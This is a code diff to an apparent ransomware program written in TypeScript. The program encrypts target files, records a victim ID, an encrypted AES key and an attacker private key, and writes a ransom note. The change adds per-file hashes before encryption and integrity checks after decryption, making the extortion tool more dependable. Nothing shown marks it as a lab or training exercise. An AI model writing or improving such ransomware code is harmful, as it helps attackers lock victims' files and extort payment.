@@ -14,6 +14,7 @@ import { createRansomNote } from './ransomNote'
 import { RansomwareLogger, LogLevel } from './logger'
 import { loadConfig } from './config'
 import { openRansomNote } from './openRansomNote'
+import { generateFileHash } from '../cryptoUtils'
 
 // Load configuration
 const config = loadConfig()
@@ -39,7 +40,8 @@ export async function encryptTargetFiles(
         encryptionTime: number,
         targetExtensions: string[],
         timestamp: Date
-    }
+    },
+    fileHashes: Map<string, string> // Added fileHashes to return type
 }> {
     logger.info(`Initializing ransomware encryption process...`)
     
@@ -93,9 +95,13 @@ export async function encryptTargetFiles(
     // Encrypt each file
     const encryptedFiles: string[] = []
     let totalEncryptionTime = 0;
+    const fileHashes = new Map<string, string>(); // Map to store file hashes
     
     for (const filePath of targetFiles) {
         try {
+            const originalFileHash = await generateFileHash(filePath); // Generate hash before encryption
+            fileHashes.set(filePath, originalFileHash); // Store the hash
+
             const encryptedPath = `${filePath}${ENCRYPTED_EXTENSION}`
             logger.encryption(`Encrypting file: ${filePath}`)
             
@@ -146,8 +152,8 @@ export async function encryptTargetFiles(
     });
 
     // Create metadata file
-    createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory)
-    logger.info(`Created metadata file with encrypted keys and IVs`)
+    createKeyMetadataFile(victimId, encryptedAESKey, targetDirectory, fileHashes)
+    logger.info(`Created metadata file with encrypted keys, IVs, and file hashes`)
 
     // Create ransom note with configured amount
     createRansomNote(
@@ -184,7 +190,8 @@ export async function encryptTargetFiles(
         encryptedAESKey,
         attackerPrivateKey,
         encryptedFiles,
-        encryptionStats
+        encryptionStats,
+        fileHashes // Added fileHashes to return object
     }
 }
 
@@ -210,7 +217,7 @@ export async function decryptFiles(
     }
 
     // Read the metadata
-    const { victimId, ivMap } = readKeyMetadataFile(
+    const { victimId, ivMap, fileHashes: originalFileHashes } = readKeyMetadataFile( // Destructure fileHashes
         metadataPath,
         targetDirectory
     )
@@ -243,6 +250,16 @@ export async function decryptFiles(
             // Decrypt the file
             await decryptFile(encryptedPath, filePath, aesKey, iv)
             
+            const decryptedFileHash = await generateFileHash(filePath); // Generate hash after decryption
+            const originalHash = originalFileHashes.get(filePath);
+
+            if (originalHash && decryptedFileHash === originalHash) {
+                logger.success(`Integrity check passed for ${filePath}`);
+            } else {
+                logger.error(`Integrity check FAILED for ${filePath}. Original hash: ${originalHash}, Decrypted hash: ${decryptedFileHash}`);
+                // Optionally, handle the failure e.g., by not deleting the encrypted file or notifying the user
+            }
+
             const fileDecryptTime = (Date.now() - fileDecryptStartTime) / 1000;
             totalDecryptionTime += fileDecryptTime;
             
